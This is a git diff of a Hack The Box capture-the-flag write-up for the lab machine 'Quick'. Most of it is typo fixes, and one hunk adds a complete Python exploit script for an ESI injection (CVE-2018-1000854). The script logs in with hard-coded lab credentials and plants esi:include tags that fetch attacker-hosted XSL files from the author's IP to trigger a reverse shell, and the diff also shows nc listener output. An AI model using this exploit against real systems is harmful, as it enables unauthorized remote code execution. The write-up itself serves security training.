@@ -1,8 +1,14 @@
+---
+description: >-
+  Zweilosec's write-up on the hard difficulty Linux machine Quick from
+  https://hackthebox.eu
+---
+
 # HTB - Quick
 
 ## Overview
 
-![](https://github.com/zweilosec/htb-writeups/tree/de76ed6e78e992dd3769f7fa850ef9167e04b2c0/linux-machines/hard/machine%3E.infocard.png)
+![](../../.gitbook/assets/0-quick-infocard.png)
 
 Short description to include any strange things to be dealt with
 
@@ -72,7 +78,7 @@ Tim from Qconsulting and Elisa from Wink are from UK- possible usernames?
 
 there is exposed db.php, though not sure how to interact
 
-there is a link to portal.quick.htb which sems to be an exact copy of the first page
+there is a link to portal.quick.htb which seems to be an exact copy of the first page
 
 [https://github.com/mazen160/server-status\_PWN](https://github.com/mazen160/server-status_PWN)
 
@@ -177,7 +183,7 @@ Nmap done: 1 IP address (1 host up) scanned in 1348.02 seconds
            Raw packets sent: 1444 (43.230KB) | Rcvd: 1157 (70.616KB)
 ```
 
-researching UDP port 443 that nmap found open leads to [https://ec.haxx.se/http/http-http3](https://ec.haxx.se/http/http-http3). I remember vaguely reading about this new protocol, but didnt expect it to already by implemented in a challenge \(kudos to MrR3boot!\) This explains why the portal.quick.htb site has a link to an https:// version that didnt work since the browser expects TCP:443.
+researching UDP port 443 that nmap found open leads to [https://ec.haxx.se/http/http-http3](https://ec.haxx.se/http/http-http3). I remember vaguely reading about this new protocol, but didnt expect it to already by implemented in a challenge \(kudos to MrR3boot!\) This explains why the portal.quick.htb site has a link to an https:// version that didn't work since the browser expects TCP:443.
 
 The QUIC protocol, which HTTP/3 uses UDP for a fast connectionless "session". Since most websites are simple requests and responses, UDP works fine, and the extra overhead from TCP just slows everything down. Supposedly QUIC will be much faster \(pun intended!\)
 
@@ -220,7 +226,7 @@ curl --alt-svc altsvc.cache https://quic.aiortc.org/
 
 [https://unix.stackexchange.com/questions/360434/how-to-install-libtoolize](https://unix.stackexchange.com/questions/360434/how-to-install-libtoolize)
 
-AFter installing rust language \(and many other dependencies\) I had a shiny new experimental version of curl to play with with http/3 support. With this I was able to download the page at [https://portal.quick.htb](https://portal.quick.htb) since I didn't want to live in the install directory I created an alias of `curl3` to the new curl with `alias curl3=</install_path/>curl`
+After installing rust language \(and many other dependencies\) I had a shiny new experimental version of curl to play with with http/3 support. With this I was able to download the page at [https://portal.quick.htb](https://portal.quick.htb) since I didn't want to live in the install directory I created an alias of `curl3` to the new curl with `alias curl3=</install_path/>curl`
 
 ```markup
 zweilos@kali:~/htb/quick$ curl3 --http3 https://portal.quick.htb/
@@ -462,7 +468,7 @@ html {
 </html>
 ```
 
-The about page contained 3 potential users and usernames:Jane Doe `jane@quick.htb`, Mike Ross `mike@quick.htb`, and John Doe `john@quick.htb`
+The about page contained 3 potential users and usernames: Jane Doe `jane@quick.htb`, Mike Ross `mike@quick.htb`, and John Doe `john@quick.htb`
 
 ```markup
 zweilos@kali:~/htb/quick$ curl3 --http3 https://portal.quick.htb/index.php?view=docs
@@ -560,7 +566,7 @@ Serving HTTP on 0.0.0.0 port 9088 ...
 10.10.10.186 - - [11/Aug/2020 21:15:36] "GET /evil.xsl HTTP/1.1" 200 -
 ```
 
-The vulnerabiliity exists in the ticket search function!
+The vulnerability exists in the ticket search function!
 
 ```text
 zweilos@kali:~/htb/quick$ python -m SimpleHTTPServer 9088
@@ -596,7 +602,108 @@ Unfortunately the file was blank. After testing it again a different way, it see
 created a python script to automate the file upload and activation process
 
 ```python
-#embed script here
+#!/usr/bin/env python3
+#coding: utf8
+#Created by zweilosec (WolfZweiler) for CVE-2018-1000854 (as exposed in HTB - quick)
+
+import requests
+from bs4 import BeautifulSoup
+import time
+import sys
+
+login_url = "http://quick.htb:9001/login.php"
+login_data = 'email=elisa@wink.co.uk&password=Quick4cc3$$'
+login_headers = {
+    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    'Accept-Language': 'en-US,en;q=0.5',
+    'Accept-Encoding': 'gzip, deflate',
+    'Cookie': 'PHPSESSID=03u65s156tk17dfddsi28m7rld', 
+    'Referer': 'http://quick.htb:9001/login.php',
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'Host': 'quick.htb:9001'}
+#TODO: Get headers from an initial GET request so have accurate PHPSESSID (not hard-coded)
+
+ticket_url = "http://quick.htb:9001/ticket.php"
+ticket_headers = {
+    'Host': 'quick.htb:9001',
+    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    'Accept-Language': 'en-US,en;q=0.5',
+    'Accept-Encoding': 'gzip, deflate',
+    'Referer': 'http://quick.htb:9001/ticket.php',
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'Cookie': 'PHPSESSID=03u65s156tk17dfddsi28m7rld'}
+
+esi1 = 'title=evil&msg="<esi:include src="http://10.10.15.10:1337/evil.xml" stylesheet="http://10.10.15.10:1337/evil.xsl"></esi:include>"&id=TKT-1234'
+esi2 = 'title=evil1&msg="<esi:include src="http://10.10.15.10:1337/evil1.xml" stylesheet="http://10.10.15.10:1337/evil1.xsl"></esi:include>"&id=TKT-2345'
+esi3 = 'title=evil2&msg="<esi:include src="http://10.10.15.10:1337/evil2.xml" stylesheet="http://10.10.15.10:1337/evil2.xsl"></esi:include>"&id=TKT-3456'
+
+ticGet1_url = 'http://quick.htb:9001/search.php?search=1234'
+ticGet2_url = 'http://quick.htb:9001/search.php?search=2345'
+ticGet3_url = 'http://quick.htb:9001/search.php?search=3456'
+ticGet_headers = {
+    'Host': 'quick.htb:9001',
+    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
+    'Accept': '*/*',
+    'Accept-Language': 'en-US,en;q=0.5',
+    'Accept-Encoding': 'gzip, deflate',
+    'Referer': 'http://quick.htb:9001/home.php',
+    'X-Requested-With': 'XMLHttpRequest',
+    'Connection': 'close',
+    'Cookie': 'PHPSESSID=03u65s156tk17dfddsi28m7rld',
+    'DNT': '1'}
+
+esi1_r, esi2_r, esi3_r = None, None, None
+
+login_r = requests.post(login_url, headers = login_headers, data = login_data)
+#login_r.status_code should be == 302, however this login request is not working correctly
+#need to further troubleshoot; for now bypassed by logging in with burp
+if login_r.status_code == 200:
+    print("Login successful!\n")
+    esi1_r = requests.post(ticket_url, headers = ticket_headers, data = esi1)
+    time.sleep(1)
+    ticGet1_r = requests.get(ticGet1_url, headers = ticGet_headers)
+    time.sleep(1)
+else:
+    print("The request failed with status code: " + str(login_r.status_code))
+    print("Did not login successfully :(\n")
+    print("Dumping response text:\n\n")
+    print(login_r.text)
+    sys.exit()
+
+if esi1_r.status_code == 200:
+    print("Evil1 upload successful!\n")
+    esi2_r = requests.post(ticket_url, headers = ticket_headers, data = esi2)
+    time.sleep(1)
+    ticGet2_r = requests.get(ticGet2_url, headers = ticGet_headers)
+    time.sleep(1)
+else:
+    print("The request failed with status code: " + str(esi1_r.status_code))
+    print("Did not upload evil1 successfully :(\n")
+    sys.exit()
+
+if esi2_r.status_code == 200:
+    print("Evil2 upload successful!\n")
+    esi3_r = requests.post(ticket_url, headers = ticket_headers, data = esi3)
+    time.sleep(1)
+    ticGet3_r = requests.get(ticGet3_url, headers = ticGet_headers)
+else:
+    print("The request failed with status code: " + str(esi2_r.status_code))
+    print("Did not upload evil2 successfully :(\n")
+    sys.exit()
+
+if esi3_r.status_code == 200:
+    print("Evil3 upload successful!\n")
+    print("Check your nc listener...shell should be inbound!\n")
+else:
+    print("The request failed with status code: " + str(esi3_r.status_code))
+    print("Did not upload evil3 successfully :(\n")
+
+#TODO: generalize urls and other data to be used other than in HTB; perhaps take as input arguments URL, PORT, USER, PASS, Commands to be run (foreach type loop)...
+#TODO: exception handling
+#TODO: instead of separate SimpleHTTPServer hosting different files, do in-script
+#TODO: instead of nc listener in terminal, implement in-script
 ```
 
 I ran the script and crossed my fingers that everything would work
@@ -648,6 +755,8 @@ zweilos@kalimaa:~/htb/quick$ nc -lvnp 13371
 
 sam@quick:~$ export TERM=xterm-256color
 ```
+
+I got a limited shell that I quickly upgraded to a fully interactive Bash shell using python.
 
 ## Road to User
 
@@ -802,12 +911,15 @@ root       1936  0.0  0.1   9364  5496 ?        Sl   15:33   0:00 containerd-shi
 root       1937  0.0  0.1   9364  5832 ?        Sl   15:33   0:00 containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/f78e2c79d2db3e029679c14060e7dcab4ffbba2167c107a7677f81024e8bc875 -address /run/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-run
 ```
 
-There were quite a few processes running related to containers...in fact, it looked like the UDP 443 port I connected to was in a container systemd.timers &lt;= lookup
+There were quite a few processes running related to containers...in fact, it looked like the UDP 443 port I connected to was in a container. systemd.timers &lt;= lookup
 
-docker0: flags=4099 mtu 1500 inet 172.17.0.1 netmask 255.255.0.0 broadcast 172.17.255.255 ether 02:42:f4:06:67:00 txqueuelen 0 \(Ethernet\) RX packets 0 bytes 0 \(0.0 B\) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 \(0.0 B\) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0
+```text
+docker0: flags=4099 mtu 1500 inet 172.17.0.1 netmask 255.255.0.0 broadcast 172.17.255.255 ether 02:42:f4:06:67:00 txqueuelen 0 (Ethernet) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0
+```
 
-/usr/bin/pkexec ---&gt; Linux4.10\_to\_5.1.17\(CVE-2019-13272\)/rhel\_6\(CVE-2011-1485\) /home/sam/.gnupg/pubring.kbx  
-/home/sam/.gnupg/trustdb.gpg /home/sam/.config/lxc/config.yml \[+\] Readable files inside /tmp, /var/tmp, /var/backups\(limit 70\) -rw------- 1 sam sam 32768 Aug 15 17:08 /tmp/hsperfdata\_sam/926 [https://bugzilla.redhat.com/show\_bug.cgi?id=1123870](https://bugzilla.redhat.com/show_bug.cgi?id=1123870) `/var/www/jobs` writeable folder but owned by root in `/var/www/printers` job.php [https://github.com/mike42/escpos-php](https://github.com/mike42/escpos-php)
+\[+\] Readable files inside /tmp, /var/tmp, /var/backups\(limit 70\) 
+
+-rw------- 1 sam sam 32768 Aug 15 17:08 /tmp/hsperfdata\_sam/926 [https://bugzilla.redhat.com/show\_bug.cgi?id=1123870](https://bugzilla.redhat.com/show_bug.cgi?id=1123870) `/var/www/jobs` writeable folder but owned by root in `/var/www/printers` job.php [https://github.com/mike42/escpos-php](https://github.com/mike42/escpos-php)
 
 db.php
 
@@ -961,7 +1073,7 @@ if ($wordlist = fopen("/home/zweilos/rockyou_utf8.txt", "r")) {
 then I ran it and didn't have to wait long
 
 ```text
-zweilos@kali:~/htb/quick$ php decrypt.php [B
+zweilos@kali:~/htb/quick$ php decrypt.php
 The password is: yl51pbx
 ```
 
@@ -1174,10 +1286,10 @@ sam@quick:~$
 I logged in successfully, now to test my port forwarding in the browser. ![](https://github.com/zweilosec/htb-writeups/tree/de76ed6e78e992dd3769f7fa850ef9167e04b2c0/linux-machines/hard/connection-reset.png) Unfortunately it didn't work, though I quickly spotted the problem. I was trying to connect to 10.10.10.186 on port 80, just from the `quick.htb` machine, which I already knew was blocked. I needed to access the site the same way I had with curl earlier, with `127.0.0.1:80`.
 
 ```text
-zweilos@kalimaa:~/htb/quick$ ssh -L 40905:127.0.0.1:80 sam@quick.htb
+zweilos@kali:~/htb/quick$ ssh -L 40905:127.0.0.1:80 sam@quick.htb
 ```
 
-Ater fixing the IP, I was able to connect to the virtual hosted page. ![](https://github.com/zweilosec/htb-writeups/tree/de76ed6e78e992dd3769f7fa850ef9167e04b2c0/linux-machines/hard/virtual_printer.png) This led me to a login page. Since I knew that the page was running as `srvadm`, I figured the credentials must be the ones I had found for that user in the MySQL database earlier. [http://pentestmonkey.net/tools/web-shells/php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
+After fixing the IP, I was able to connect to the virtual hosted page. ![](https://github.com/zweilosec/htb-writeups/tree/de76ed6e78e992dd3769f7fa850ef9167e04b2c0/linux-machines/hard/virtual_printer.png) This led me to a login page. Since I knew that the page was running as `srvadm`, I figured the credentials must be the ones I had found for that user in the MySQL database earlier. [http://pentestmonkey.net/tools/web-shells/php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
 
 ### Getting a shell
 
@@ -1391,7 +1503,11 @@ Server: Jetty(9.1.z-SNAPSHOT)
 Connection closed by foreign host.
 ```
 
-[https://www.cvedetails.com/cve/CVE-2017-7658/](https://www.cvedetails.com/cve/CVE-2017-7658/) [https://www.cvedetails.com/vulnerability-list/vendor\_id-10410/product\_id-34824/Eclipse-Jetty.html](https://www.cvedetails.com/vulnerability-list/vendor_id-10410/product_id-34824/Eclipse-Jetty.html) [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
+[https://www.cvedetails.com/cve/CVE-2017-7658/](https://www.cvedetails.com/cve/CVE-2017-7658/)
+
+ [https://www.cvedetails.com/vulnerability-list/vendor\_id-10410/product\_id-34824/Eclipse-Jetty.html](https://www.cvedetails.com/vulnerability-list/vendor_id-10410/product_id-34824/Eclipse-Jetty.html)
+
+ [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
 
 ```text
 srvadm@quick:~/.cache$ ls -la
